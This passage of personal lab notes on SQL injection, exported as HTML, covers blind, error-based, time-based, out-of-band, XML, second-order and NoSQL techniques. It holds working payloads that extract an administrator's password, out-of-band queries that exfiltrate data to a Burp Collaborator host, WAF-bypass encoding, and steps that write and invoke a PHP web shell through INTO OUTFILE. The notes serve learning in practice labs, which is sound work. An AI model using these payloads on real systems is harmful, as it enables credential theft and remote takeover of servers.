LENGTH(password)&gt;1)=&#x27;a: to verify the length of password is greater than 1</li></ul><ul id="cf212d85-173b-40c9-9307-f2e8b743e2bd" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;a : To check the first letter of the password is a or not</li></ul><ul id="c32ea99e-243d-4d2c-91e1-4461457a7e69" class="bulleted-list"><li style="list-style-type:disc">Check The attack type in the intruder i used Cluster Bomb for this attack the default is Spider</li></ul></details></li></ul></div></p></details></li></ul><h3 id="17745f96-b273-443d-856e-830f3477b25d" class="">Error Based SQLi</h3><ul id="c748d278-cb90-43fc-bb05-bfe5986c9c2e" class="bulleted-list"><li style="list-style-type:disc">You can induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section.</li></ul><ul id="d90b67db-762e-4b52-9c8c-62107b0fe38f" class="toggle"><li><details open=""><summary>Error Based Blind SQLi</summary><ul id="52c0dd5b-b2b2-40df-9874-c0be603fc534" class="bulleted-list"><li style="list-style-type:disc">some applications <em>give the same response even if we put a false or true</em> condition in the SQL query but we can <em>induce errors</em> in that case to get the result</li></ul><ul id="046f9352-5334-45d8-965b-d5074d033e41" class="bulleted-list"><li style="list-style-type:disc">we can modify the query so that it causes a database error when the condition is true</li></ul><ul id="e6ebf85a-bbb0-4e58-9a63-2899b0ac07a9" class="bulleted-list"><li style="list-style-type:disc">Taking the TrackingID example of the Blind SQL <p id="00c7d3f9-4fec-46cf-b44f-c1ee6af6085e" class="">xyz&#x27; AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE &#x27;a&#x27; END)=&#x27;a</p><ul id="8d90ce10-9bdf-4526-aaae-330e44c478c7" class="bulleted-list"><li style="list-style-type:circle">If the condition is True then 1/0 will be executed else ‘a’ will be the result and ‘a’=’a’ will result in true and the overall condition will become <strong>TRUE(when the condition is false )</strong></li></ul><ul id="b1bbb385-5e2e-4978-9ead-39a38d2477c0" class="bulleted-list"><li style="list-style-type:circle">The Payload will be</li></ul><p id="f892bc76-37c3-40f5-92e4-789f15b51281" class="">xyz&#x27; AND (SELECT CASE WHEN (Username = &#x27;Administrator&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;m&#x27;) THEN 1/0 ELSE &#x27;a&#x27; END FROM Users)=&#x27;a</p></li></ul><ul id="899185eb-c343-4fc9-8ddb-5d9a8af8a130" class="toggle"><li><details open=""><summary>Steps</summary><ul id="396c6b11-7b54-4ea4-9af0-ceadd74de388" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz’ :put a ‘ after the id to see if any error occured</li></ul><ul id="465cc7db-27cb-466e-a4ec-d990801ef956" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz’’ : Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.</li></ul><ul id="4ea19b5d-2fce-4e60-b957-8bc4fc83f36d" class="bulleted-list"><li style="list-style-type:disc">we try putting ;,—,#,1=1 and many more but only string concatenation shows some output </li></ul><ul id="78b7ff36-a9fd-4042-89c7-52c803bdc41b" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27;||(SELECT &#x27;&#x27;)||’ : to check if error we are getting is a sqli error or not, if it still invalid then specify a table name as it might be a oracle database</li></ul><ul id="fff89a4e-4960-8079-8c3b-c00c8fece278" class="bulleted-list"><li style="list-style-type:disc">or TrackingId=xyz&#x27;||(SELECT &#x27;hello&#x27;) - -</li></ul><ul id="6c7f9431-d8bd-4bd0-9886-5f8eca800b27" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27;||(SELECT &#x27;&#x27; From table_name)||’ : predict a possible table name. Oracle DB requires a table name with every SELECT query or use dual which is a predefined table in oracle(200 status code)</li></ul><ul id="54a432d5-b2f0-4ec4-8a4e-311b0d93f391" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27;||(SELECT &#x27;&#x27; FROM not-a-real-table)||’ : Try using this invalid query and if an error occurs then the server is processing the injection as a SQL query at the backend </li></ul><ul id="41038c73-b368-41f1-a7f4-2a7bc43e80bf" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27;||(SELECT &#x27;&#x27; FROM users WHERE ROWNUM = 1)||’ :  if this query doesn’t give any error we can say that users table exits(check for 200 status code)<ul id="e92f728d-859e-4236-b820-ceb5ae622e0c" class="bulleted-list"><li style="list-style-type:circle">Don’t forget to use ROWNUM=1 as this will break the concatenation</li></ul></li></ul><ul id="f7d28645-a2e6-439e-82ca-cd7841581bc9" class="bulleted-list"><li style="list-style-type:disc">This confirms that if our query is executing either the condition is true or false we get a 200 status Ok code and 500 if our query is not executing in db</li></ul><ul id="0416dbde-de20-4f21-bd9d-6cffa69f2729" class="bulleted-list"><li style="list-style-type:disc">now we will utilise the 200 code and raise an intentional error when our condition is false</li></ul><ul id="7fa3dc34-03c8-4cdb-9a40-15fed4aa2a60" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM dual)||’ : verify the error msg is received by exploiting this condition</li></ul><ul id="ce8716d2-3e86-4862-85b8-2fd9a54c48d1" class="bulleted-list"><li style="list-style-type:disc">TrackingId=xyz&#x27;||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM dual)||’ : verify if the error msg disappears</li></ul><ul id="a6b88e02-de0a-42e2-a0d0-4a13f76fb5f2" class="bulleted-list"><li style="list-style-type:disc">TrackingId=A2pAbBjW2d5OuUVP&#x27;||(select case when (LENGTH((Select password from users where username=&#x27;administrator&#x27;))=1)then &#x27;&#x27; else to_char(1/0) end FROM dual)—: check the length you will get 200 only on the correct length</li></ul><ul id="280e0c10-db3c-405e-9da6-81f58d615446" class="bulleted-list"><li style="list-style-type:disc">TrackingId=A2pAbBjW2d5OuUVP&#x27;||(select case when (SUBSTR((Select password from users where username=&#x27;administrator&#x27;),§1§,1)=&#x27;§a§&#x27;)then &#x27;&#x27; else to_char(1/0) end FROM dual)—: to get the password </li></ul></details></li></ul></details></li></ul><ul id="dae74a3d-7c12-464c-8e35-de537b733de8" class="bulleted-list"><li style="list-style-type:disc">You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.</li></ul><p id="0f109fc4-4bdb-401f-bfd7-77a8e3f812b6" class=""><strong>Visible Error</strong></p><ul id="97861eec-b3e0-4c24-87c8-23a7a9950bb1" class="bulleted-list"><li style="list-style-type:disc">Sometimes the data gives proper information of the error and we can induce result of our payload in that error using the cast() function</li></ul><ul id="54dd6b8b-9139-4f29-951c-13e5deaaac98" class="bulleted-list"><li style="list-style-type:disc">CAST((SELECT example_column FROM example_table) AS int): this will try to convert  a string into an integer that will give the following error<p id="c3163bf4-a15d-4cf8-98fd-cdc450242966" class="">ERROR: invalid input syntax for type integer: &quot;Example data” : this will expose the data</p><ul id="26a55849-92dc-4a67-a8c6-50db1c560ec6" class="toggle"><li><details open=""><summary>steps</summary><ul id="5118a87e-edde-4bb6-a36c-a4087983af51" class="bulleted-list"><li style="list-style-type:disc">check using ‘ that any error occurs or not and we get any error msg : in this case we got the whole query</li></ul><ul id="e4ffe7bd-245a-4125-bf7b-1dc89e4d6b31" class="bulleted-list"><li style="list-style-type:disc">now add ‘ - - in front of the tracking id and check that the error disappears means that the query is valid </li></ul><ul id="0c1854bd-61d1-45c0-ba73-747df5dbfd87" class="bulleted-list"><li style="list-style-type:disc">TrackingId=54V2MrbCAdqSzCCQ&#x27; and cast((select 1) as int)- - : try this query to check that we get any info in the error according to our change. we got an msg to convert int to boolean for any and operation</li></ul><ul id="25a79b42-9ac8-4417-ac99-77ed4a797417" class="bulleted-list"><li style="list-style-type:disc">TrackingId=54V2MrbCAdqSzCCQ&#x27; and 1=cast((select 1) as int)- - : we add to 1= to finally evaluate this as boolean: this don’t give any error as the condition is true</li></ul><ul id="d32ceb8b-ea12-4246-b312-7000e0f4ac32" class="bulleted-list"><li style="list-style-type:disc">TrackingId=54V2MrbCAdqSzCCQ&#x27; and 1=cast((select ‘hi’) as int)- -: try a string and check whether the error msg highlights the string or not if yes then put your payload here</li></ul><ul id="a19c1456-8865-48a3-902d-429b2c99a62e" class="bulleted-list"><li style="list-style-type:disc">TrackingId=54V2MrbCAdqSzCCQ&#x27; and 1=cast((select password from users where username=administrator ) as int) - - : this will show a msg that our original query is trimmed because of the character limit maybe remove that tracking id to get some space</li></ul><ul id="b2383095-d1ee-48f4-8fd7-861d1edf631a" class="bulleted-list"><li style="list-style-type:disc">TrackingId=&#x27; AND 1=CAST((SELECT username FROM users) AS int)- -: this will also give error as it returns more than 1 row</li></ul><ul id="f11f4bef-7e34-47b6-b921-0b4b32f2c8dd" class="bulleted-list"><li style="list-style-type:disc">TrackingId=&#x27; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)- - : this will return only one row</li></ul><ul id="ccc0e86d-d958-4a19-b0b6-86e864602442" class="bulleted-list"><li style="list-style-type:disc">it will give the first username of 1st row if it is administrator then fetch password instead of username for the same</li></ul><ul id="29424614-a5a7-4e1b-9ca9-4c41894474e5" class="bulleted-list"><li style="list-style-type:disc">TrackingId=&#x27; AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)- - : this will fetch password from the 1st row</li></ul><ul id="6a1be4cd-fbf4-4da0-b97b-f5cf02ae00d7" class="bulleted-list"><li style="list-style-type:disc">if in case you don’t find admin on first row you can try fetching other rows using<ul id="8d1313b9-d4e2-404f-8f8a-b83da64a932c" class="bulleted-list"><li style="list-style-type:circle">TrackingId=&#x27; AND 1=CAST((SELECT password FROM users LIMIT 1 offset 2) AS int)- - : this will return the third row</li></ul></li></ul></details></li></ul></li></ul><h3 id="75e5c9a3-7752-41dd-9e5c-d4a6b34ab602" class="">Time Based Blind SQLi</h3><ul id="fd29a97a-e811-47ce-8c28-02addcc8d4b4" class="bulleted-list"><li style="list-style-type:disc">if the application catches the errors and manages them gracefully that no error shows on the screen then the previous attack won’t work</li></ul><ul id="6ce44645-ff32-41a3-9a46-eddfb7f4e6c3" class="bulleted-list"><li style="list-style-type:disc">but we can delay the response of the query based on its boolean value using<p id="b46a3684-b21b-4486-8f2d-b306f9f15dd4" class="">&#x27;; IF (1=2) WAITFOR DELAY &#x27;0:0:10&#x27;—</p></li></ul><ul id="c53fbe54-9a08-4528-b3ca-b701d8743c3c" class="bulleted-list"><li style="list-style-type:disc">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;Administrator&#x27; AND SUBSTRING(Password, 1, 1) = &#x27;m&#x27;) = 1 WAITFOR DELAY &#x27;0:0:{delay}&#x27;— :<em><span style="border-bottom:0.05em solid"> using count function here as if there is no user named administrator than the query will not raise a error and the count function will just return 0 and the admin won’t be alerted.</span></em></li></ul><ul id="80879976-712a-4bfd-8641-3b2f2e2d25d6" class="toggle"><li><details open=""><summary>Steps</summary><ul id="9c80f5d7-7e2d-4ff9-bf68-8351ed77874b" class="bulleted-list"><li style="list-style-type:disc">tried using ‘ and ‘’ at the end of the id nothing changes</li></ul><ul id="c736ebde-f2cc-4397-8347-07f78cc167b5" class="bulleted-list"><li style="list-style-type:disc">tried using ‘|| select sleep(10) ||’ : didn’t work</li></ul><ul id="de46044a-38e4-46b2-a427-28d141a83839" class="bulleted-list"><li style="list-style-type:disc">tried using ‘|| select pg_sleep(10) ||’ : didn’t work</li></ul><ul id="22ff6df3-6359-445b-89b1-7f6a804b09fe" class="bulleted-list"><li style="list-style-type:disc">tried using ‘|| select sleep(10)- -: didn’t work</li></ul><ul id="3ffa1026-4ea8-4efa-b927-581202fe274b" class="bulleted-list"><li style="list-style-type:disc">then i removed select, tried using ‘|| pg_sleep(10) ||’ : it works and the response came after 10s</li></ul><ul id="9a66829a-bc66-440a-a11b-585c20424bcd" class="bulleted-list"><li style="list-style-type:disc">TrackingId=j&#x27;||CASE+WHEN+(username=&#x27;administrator&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users- -: ran to check if there is an user named administrator </li></ul><ul id="8ec161c5-af90-4eb0-9adf-5ecd4b3f6d34" class="bulleted-list"><li style="list-style-type:disc">TrackingId=tBwhDSHIECFqhCyK&#x27;||case+when+(length((select password from users where username =&#x27;administrator&#x27;))=20)then+pg_sleep(10)+else+pg_sleep(0)+end||’ : I ran this query to check the length of the password</li></ul><ul id="5720d9b1-03e6-4c33-b225-6294f4c53901" class="bulleted-list"><li style="list-style-type:disc"> TrackingId=tBwhDSHIECFqhCyK&#x27;||case+when+(substring((select password from users where username =&#x27;administrator&#x27;),§i§,1)=&#x27;§a§&#x27;)then+pg_sleep(10)+else+pg_sleep(0)+end||’ : run a cluster bomb over this payload and to see the response time in the results tab of the intruder on the upper left go to <em><strong>column</strong></em> then<em> </em><em><strong>turn on response received</strong></em></li></ul></details></li></ul><h1 id="ebd14595-5026-43e4-8b31-e4550ee7c534" class="">Out of Band SQLi</h1><ul id="ea086027-cbcf-46ce-abbe-138944bd6db7" class="bulleted-list"><li style="list-style-type:disc">The application continues processing the user&#x27;s request in the original thread, and uses another thread to execute a SQL query using the tracking cookie</li></ul><ul id="28a3de87-3b04-4ab1-ba5c-2bdce6397303" class="bulleted-list"><li style="list-style-type:disc"> typically the most effective is DNS (domain name service)</li></ul><ul id="71a7216c-d502-459c-91ce-0c6eb055c38f" class="bulleted-list"><li style="list-style-type:disc">You can view the interaction of the injection on your website or your server instead of the target&#x27;s server . This is called<em><span style="border-bottom:0.05em solid"> out of band interaction </span></em></li></ul><ul id="1cbc08f6-4aee-4867-ad4c-176fb7c1414a" class="bulleted-list"><li style="list-style-type:disc">interactsh (google), burp collaborator ,<a href="https://public.requestbin.com/r/en9x3re1ifb3"> requestbin</a>: this will give us a link and we can see what request are made to that URL and what response does our server gave</li></ul><ul id="e32d555d-fd00-44e0-976f-bea67c77bf00" class="bulleted-list"><li style="list-style-type:disc">Once confirmed that the target supports out of band we can inject payloads to retrieve info</li></ul><ul id="e7db71ce-3528-455e-af9d-dc527b9b7a02" class="bulleted-list"><li style="list-style-type:disc">&#x27;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#x27;Administrator&#x27;);exec(&#x27;master..xp_dirtree &quot;//&#x27;+@p+&#x27;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;&#x27;)— : using this query we can get the password or output of the query on the subdomain of the link we prove as a DNS lookup</li></ul><ul id="7f453284-8686-47ae-bc6f-187fbfab9eb8" class="bulleted-list"><li style="list-style-type:disc">S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net DNS query will look like this </li></ul><ul id="b0f2f658-f2ae-4f9e-8122-5397d4e460d9" class="bulleted-list"><li style="list-style-type:disc">or we can use the same query from the SQLi cheat sheet </li></ul><ul id="4c163e49-6a85-49e0-a13c-37fcdd207c8c" class="bulleted-list"><li style="list-style-type:disc">SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://’||(select password from users where username = ‘administrator’)||’.&lt;your domain here&gt;/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) FROM dual : this will also work same</li></ul><h3 id="06021c01-5636-42be-81b0-20ec7b579c43" class="">SQLi with XML</h3><ul id="9d1189a7-213d-4f31-bc17-39372023ca21" class="bulleted-list"><li style="list-style-type:disc">you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database</li></ul><ul id="a3fafa74-797e-4b6b-924e-b048b0138464" class="bulleted-list"><li style="list-style-type:disc">This can be a good way to bypass WAF and obfuscate our attacks as they are set to capture any SQL syntax and using this we can encode or bypass them</li></ul><ul id="91de6ba0-8c29-4d79-bc23-5f0677e741c9" class="bulleted-list"><li style="list-style-type:disc">For example, the following XML-based SQL injection uses an XML escape sequence to encode the <code>S</code> character in <code>SELECT</code>:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="31c26f75-4aae-45e8-95b6-23151fc3cb7b" class="code"><code class="language-XML">&lt;stockCheck&gt;
&lt;productId&gt;123&lt;/productId&gt;
&lt;storeId&gt;999 &amp;#x53;ELECT * FROM information_schema.tables&lt;/storeId&gt;
&lt;/stockCheck&gt;</code></pre></li></ul><ul id="fff89a4e-4960-8099-89fa-fecdc83d10f0" class="bulleted-list"><li style="list-style-type:disc">We can use an extension named <em><span style="border-bottom:0.05em solid">hackverter </span></em>to decode the SQL query and bypass WAF</li></ul><ul id="9bda0f47-53c7-469e-be7c-37a6fd9450c7" class="bulleted-list"><li style="list-style-type:disc">In the last lab, i gave this code in the XML i tried so many times putting <ul id="10998293-2d89-4bc8-81b5-43617d98fb30" class="bulleted-list"><li style="list-style-type:circle">‘</li></ul><ul id="f6cfa9be-3517-49f1-b879-054e15b8bc55" class="bulleted-list"><li style="list-style-type:circle">‘ union select ..</li></ul><ul id="653d8474-9aa5-4851-a86c-c50b601ba35c" class="bulleted-list"><li style="list-style-type:circle">1 ‘ union select</li></ul><ul id="75ee5d60-050b-419a-ad04-598e0c4b1523" class="bulleted-list"><li style="list-style-type:circle">‘|| select ..||’</li></ul><ul id="235b85e1-9a00-4a85-9308-4172836ad7c9" class="bulleted-list"><li style="list-style-type:circle">‘ select …</li></ul><ul id="e7baba6e-683d-47d6-9177-06138acf6d39" class="bulleted-list"><li style="list-style-type:circle">try adding and removing comments at the end</li></ul><ul id="14847c76-d280-4819-b532-4a404693b729" class="bulleted-list"><li style="list-style-type:circle">1 union select: this code works</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="319cd4ae-7069-48cb-b62e-cd1c64abb406" class="code"><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;stockCheck&gt;&lt;productId&gt;10&lt;/productId&gt;&lt;storeId&gt;
&lt;@hex_entities&gt;1 union select password from users where username=&#x27;administrator&#x27;--&lt;@/hex_entities&gt;
&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre></li></ul><h3 id="c6ab9f01-935b-4fed-9a52-529c257f2d0e" class="">Second order SQLi</h3><ul id="08b24604-8ab2-496d-a85c-0d83ba9770b8" class="bulleted-list"><li style="list-style-type:disc">Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way.</li></ul><p id="ac74170b-50e6-43f0-9108-5a05c1187bc0" class="">
</p><h1 id="d302bb59-190b-417b-9fbd-f6e436c66009" class="">RCE from SQLi</h1><ul id="fae8160e-08df-4a45-8440-609e97c7f4ce" class="bulleted-list"><li style="list-style-type:disc">Once you found a sqli injection point and the query use </li></ul><ul id="fec2db64-1907-46c4-89ee-5e3e136e1d33" class="bulleted-list"><li style="list-style-type:disc">‘ UNION SELECT ‘hello’ into outfile /home/user/file.txt : this will write hello in the file</li></ul><ul id="2ef81203-3137-476f-9c27-4b4c0dd027e2" class="bulleted-list"><li style="list-style-type:disc">select ‘reverse_shell’ into outfile file.php :will write the code in the file but we will not know the location</li></ul><ul id="7301f48b-dd25-43be-8425-78ed52034497" class="bulleted-list"><li style="list-style-type:disc">check the service and upload the code in the default path of that service</li></ul><ul id="92f3f002-0809-45b2-8f16-e5af214dcfa4" class="bulleted-list"><li style="list-style-type:disc">curl HTTP://&lt;ip&gt;/file.php : will execute the sell</li></ul><ul id="993973ce-ce29-410d-a223-9c8976d59245" class="bulleted-list"><li style="list-style-type:disc">SELECT ‘hello’ into outfile ‘http://&lt;IP&gt;:80’ : outfile function will request to the link if given or else write the output</li></ul><ul id="aaa21483-13db-4fb6-8ea7-cc8f8e1f6ec5" class="bulleted-list"><li style="list-style-type:disc">a simple PHP payload ‘&lt;?php echo system ($_GET[”cmd”])?&gt;’ </li></ul><ul id="29efb6d3-a71d-41e3-8a38-aff57d1df83b" class="bulleted-list"><li style="list-style-type:disc">execute commands like : HTTP://&lt;IP&gt;/file.php?cmd=whoami</li></ul><p id="10e89a4e-4960-807d-ac5b-ebeba690a905" class="">
</p><h3 id="10e89a4e-4960-8080-a6ed-d9b7a1d6455c" class="">SQLmap</h3><ul id="78012153-aa0a-47ee-8f6d-efdf8c589443" class="bulleted-list"><li style="list-style-type:disc">- -os-shell  is used to get command execution via sqli in SQL map</li></ul><ul id="10e89a4e-4960-802f-9716-da0d6ee51888" class="bulleted-list"><li style="list-style-type:disc">-u : to add the url</li></ul><ul id="10e89a4e-4960-80fc-a357-d32b8f259e91" class="bulleted-list"><li style="list-style-type:disc">- -data=”Post=request&amp;parameters=here” -p post : select a specific parameter to test for sqli </li></ul><ul id="10e89a4e-4960-8008-b4a6-fd7b2f67b663" class="bulleted-list"><li style="list-style-type:disc">-r complete_http_request.txt -p parameter</li></ul><h3 id="8afb8561-d43e-4c5b-8f09-e6f8ee6dc97a" class="">NO SQL</h3><ul id="1e49dea0-d974-4349-98f3-5ea5d3757859" class="bulleted-list"><li style="list-style-type:disc">db = db and tables = collections</li></ul><ul id="d7e2eb98-35ab-4430-98e1-f617d7144fa3" class="bulleted-list"><li style="list-style-type:disc">MongoDB</li></ul><ul id="c6fb8c89-cdb8-4bfd-8b32-a115f2d4f3b2" class="bulleted-list"><li style="list-style-type:disc">db.collection_name.find(): used to list all the documents (entry fields) </li></ul><ul id="451010b0-d476-4751-bc52-38e47f8de563" class="bulleted-list"><li style="list-style-type:disc">db.collection_name.find({”user”: “Alexis”}): used to find the entries of that user</li></ul><ul id="5a4da519-fc92-4122-a5ba-313637c4d025" class="bulleted-list"><li style="list-style-type:disc">db.collection_name.count(): count  the no of entries in the output</li></ul><ul id="19a5ec7e-3296-471f-bd66-a04308f4ffe6" class="bulleted-list"><li style="list-style-type:disc">db.collection_name.find({”salary:{$gt:20000}”}): to get all entries whose salary are greater than 20000</li></ul><ul id="8cb40a3f-88ea-4292-9d6d-6f670560552f" class="bulleted-list"><li style="list-style-type:disc">db.collection_name.find({$and:[{”salary”:{$gt:20000}},{”work_hours”:{$gt:8}}]}): using and operator</li></ul><ul id="4e1d1261-c7b1-4bc3-988b-60e359ff2928" class="bulleted-list"><li style="list-style-type:disc">db.city.find({”city”:{$regex:”^Ha.*”}}) : any entry where city name starts from Ha will be printed</li></ul><ul id="e3fd98a9-ede3-4369-b99f-95e4680cb96b" class="bulleted-list"><li style="list-style-type:disc">db.city.aggregate({”$group”:{”_id”:null,avg:{$avg:”$pop”}}}) : perform an average</li></ul><ul id="3bfafcb6-7709-4d4c-b859-464120ff81ec" class="bulleted-list"><li style="list-style-type:disc">in parameter, name[$ne]=admin :add $ne in front of them </li></ul><p id="3d26e7a4-eec4-4c7b-a8a6-3fbc7cbf5f15" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>